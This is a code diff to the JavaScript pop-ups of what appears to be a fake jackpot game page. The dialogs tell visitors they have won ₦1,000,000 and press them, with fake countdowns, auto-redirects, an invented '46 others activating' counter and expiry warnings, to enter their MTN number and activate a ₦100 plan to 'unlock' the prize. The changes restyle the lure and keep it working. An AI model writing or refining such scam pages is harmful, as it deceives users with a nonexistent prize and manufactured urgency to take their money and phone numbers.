@@ -903,10 +903,19 @@
     
     function dialog1() {
         Swal.fire({
-            text: 'Empty box! Keep trying. You have (2) more attempts.',
-            confirmButtonText: 'TRY AGAIN',
+            title: '🎯 Almost There!',
+            html: '<div style="text-align: center; padding: 10px;"><h3 style="color: #ff6b35; margin: 0 0 10px 0;">💎 Keep Going!</h3><p style="font-size: 1.1em; margin: 0 0 15px 0; font-weight: bold;">You have <span style="color: #ff0000; font-size: 1.3em;">2</span> more attempts to win ₦1,000,000!</p><div style="background: #fff3cd; padding: 10px; border-radius: 5px; border: 1px solid #ffcc00;"><small style="font-weight: bold; color: #000;">⚠️ Try again to match the winning combination!</small></div></div>',
+            confirmButtonText: '🚀 TRY AGAIN',
             confirmButtonColor: '#ffcc00',
-            icon: 'error'
+            cancelButtonColor: '#6c757d',
+            showCancelButton: true,
+            cancelButtonText: 'CANCEL',
+            icon: 'warning',
+            iconColor: '#ff6b35',
+            backdrop: 'rgba(255,107,53,0.1)',
+            timer: 8000,
+            timerProgressBar: true,
+            showConfirmButton: true
         });
     }
     
@@ -918,8 +927,8 @@
         const swalWithTimer = Swal.mixin({
             icon: 'success',
             iconHtml: '🏆',
-            title: '🚨 WINNER! 🚨',
-            html: '<div style="text-align: center; animation: shake 0.5s infinite;"><h1 style="color: #ff0000; font-size: 2em; margin-bottom: 10px; text-shadow: 0 0 10px rgba(255,0,0,0.5);">🔥 YOU WON ₦1,000,000! 🔥</h1><div style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; padding: 25px; border-radius: 10px; border: 3px solid #000; margin: 20px 0; box-shadow: 0 0 20px rgba(255,0,0,0.5);"><div style="font-size: 2.5em; font-weight: 900; margin-bottom: 10px; animation: pulse 1s infinite;">🏆 ₦1,000,000 CASH! 🏆</div><div style="font-size: 1.4em; font-weight: bold; background: rgba(255,255,0,0.8); color: #ff0000; padding: 8px; border-radius: 5px; animation: blink 0.5s infinite;">⚠️ LOCKED FOR 60 SECONDS ONLY!</div></div><div style="background: #ffcc00; padding: 20px; border-radius: 10px; margin: 15px 0; border: 3px solid #000; box-shadow: 0 0 15px rgba(255,204,0,0.5);"><h3 style="color: #ff0000; font-size: 1.5em; margin: 0 0 15px 0; animation: flash 1s infinite;">🚨 FINAL STEPS - ACTIVATE NOW! 🚨</h3><ol style="text-align: left; margin: 0 auto; display: inline-block; font-size: 1.2em; font-weight: bold; line-height: 1.6;"><li><strong style="color: #ff0000; font-size: 1.3em;">AUTO-REDIRECTING IN <span id="countdown" style="color: #ff0000; font-weight: 900; animation: pulse-text 0.8s infinite;">' + countdownSeconds + '</span> SECONDS!</strong></li><li>Enter your MTN number</li><li>Activate ₦100 plan to unlock INSTANT ₦1M!</li></ol></div><div style="font-size: 1.3em; font-weight: bold; color: #ff0000; margin: 20px 0; background: rgba(255,0,0,0.1); padding: 15px; border-radius: 8px; animation: glow-text 1s infinite alternate;">⏰ REDIRECTING IN <span id="countdown" style="font-size: 1.5em; animation: pulse 0.5s infinite;">' + countdownSeconds + '</span> SECONDS!</div><div style="background: #ff0000; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; font-weight: bold; font-size: 1.2em; animation: flash 0.3s infinite;">🚨 WARNING: OFFER EXPIRES IF YOU DELAY! 🚨</div><br><button id="cancelRedirect" style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; border: 2px solid #000; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: 900; font-size: 1.1em; animation: shake-button 2s infinite; text-transform: uppercase;">❌ NO! I DON\'T WANT ₦1M</button></div>',
+            title: '🎉 JACKPOT WINNER! 🎉',
+            html: '<div style="text-align: center;"><h2 style="color: #ff6b35; font-size: 1.4em; margin-bottom: 15px;">🎉 JACKPOT WINNER! 🎉</h2><div style="background: #fff3cd; padding: 20px; border-radius: 8px; border: 2px solid #ff0000; margin: 20px 0;"><div style="color: #000; font-size: 1.5em; font-weight: bold; margin-bottom: 10px;">🏆 YOUR PRIZE: ₦1,000,000 🏆</div><div style="color: #ff0000; font-weight: bold;">⚠️ RESERVED FOR 60 SECONDS!</div></div><div style="background: #ffcc00; padding: 15px; border-radius: 8px; margin: 15px 0;"><h4 style="color: #000; margin: 0 0 10px 0;">🔥 NEXT STEPS:</h4><ol style="text-align: left; margin: 10px auto; display: inline-block; font-weight: bold;"><li>Auto-redirecting in <span id="countdown" style="color: #ff0000; font-weight: 900;">' + countdownSeconds + '</span> seconds</li><li>Enter your MTN number</li><li>Activate ₦100 plan to unlock ₦1M</li></ol></div><div style="font-weight: bold; color: #ff6b35; margin: 15px 0;">💥 REDIRECTING IN <span id="countdown">' + countdownSeconds + '</span> SECONDS...</div><div style="background: #ff6b35; color: white; padding: 10px; border-radius: 5px; font-weight: bold;">⚠️ OFFER EXPIRES IF YOU DELAY!</div><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 10px 16px; border-radius: 5px; cursor: pointer; font-weight: bold;">❌ CANCEL</button></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
             timer: countdownSeconds * 1000,
@@ -1004,11 +1013,11 @@
         Swal.fire({
             icon: 'success',
             iconHtml: '💰',
-            title: '⚠️ TIME RUNNING OUT! ⚠️',
-            html: '<div style="text-align: center; animation: shake 0.5s infinite;"><h2 style="color: #ff0000; font-size: 1.8em; margin-bottom: 15px; text-shadow: 0 0 10px rgba(255,0,0,0.5); animation: flash 1s infinite;">🚨 YOUR ₦1M IS EXPIRING! 🚨</h2><div style="background: linear-gradient(45deg, #ff0000, #ff6b35); color: white; padding: 25px; border-radius: 10px; border: 3px solid #000; margin: 20px 0; box-shadow: 0 0 20px rgba(255,0,0,0.5);"><div style="font-size: 2em; font-weight: 900; margin-bottom: 10px; animation: pulse 1s infinite;">🏆 ₦1,000,000 WAITING! 🏆</div><div style="font-size: 1.3em; font-weight: bold; background: rgba(255,255,0,0.8); color: #ff0000; padding: 8px; border-radius: 5px; animation: blink 0.5s infinite;">⚠️ <span id="otherActivating">46</span> PEOPLE ACTIVATING NOW!</div></div><div style="background: #ffcc00; padding: 20px; border-radius: 10px; margin: 15px 0; border: 3px solid #000; box-shadow: 0 0 15px rgba(255,204,0,0.5);"><h3 style="color: #ff0000; font-size: 1.4em; margin: 0 0 15px 0; animation: flash 1s infinite;">🔥 ACTIVATE BEFORE IT\'S GONE! 🔥</h3><ol style="text-align: left; margin: 0 auto; display: inline-block; font-size: 1.1em; font-weight: bold; line-height: 1.6;"><li>• Click <strong style="color: #ff0000; font-size: 1.3em;">"ACTIVATE ₦1M NOW!"</strong></li><li>• Enter MTN number (takes 10 seconds)</li><li>• <strong style="color: #ff0000;">₦100 = ₦1,000,000 INSTANT!</strong></li></ol><div style="background: #ff0000; color: white; padding: 12px; border-radius: 8px; margin-top: 15px; font-weight: bold; font-size: 1.1em; animation: flash 0.3s infinite;">⏰ OFFER EXPIRES: <span id="expiryTimer" style="font-weight: 900; animation: pulse 0.5s infinite;">59</span>...<span id="expiryTimer2">58</span>...<span id="expiryTimer3">57</span>...</div></div></div>',
+            title: '💰 FINAL STEP TO CLAIM ₦1,000,000! 💰',
+            html: '<div style="text-align: center;"><h3 style="color: #ff6b35; font-size: 1.3em; margin-bottom: 15px;">🎯 WINNER CONFIRMED!</h3><div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin: 15px 0; border: 2px solid #ff0000;"><div style="color: #000; font-size: 1.2em; font-weight: bold; margin-bottom: 10px;">🔥 SECURE YOUR PRIZE:</div><ul style="text-align: left; margin: 0 auto; display: inline-block; font-weight: bold;"><li>• Click "CLAIM MY ₦1M NOW"</li><li>• Enter MTN number (10 seconds)</li><li>• <strong style="color: #ff0000;">₦100 = ₦1,000,000!</strong></li></ul></div><div style="background: #ff6b35; color: white; padding: 12px; border-radius: 8px; margin-top: 15px; font-weight: bold;">⚠️ <span id="otherActivating">46</span> others activating now!</div></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<button onclick="handleManualClick()" style="background: linear-gradient(45deg, #ff0000, #ff6b35, #ffcc00); color: white; border: 3px solid #000; padding: 15px 20px; border-radius: 10px; cursor: pointer; font-weight: 900; font-size: 1.3em; width: 100%; animation: shake-button 2s infinite; text-transform: uppercase; text-shadow: 1px 1px 3px rgba(0,0,0,0.7);">🚨 ACTIVATE ₦1,000,000 NOW! 🚨</button>'
+            footer: '<button onclick="handleManualClick()" style="background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%; padding: 12px; font-size: 1.1em;">🚀 CLAIM ₦1,000,000 NOW! 🚀</button>'
         });
     }
 
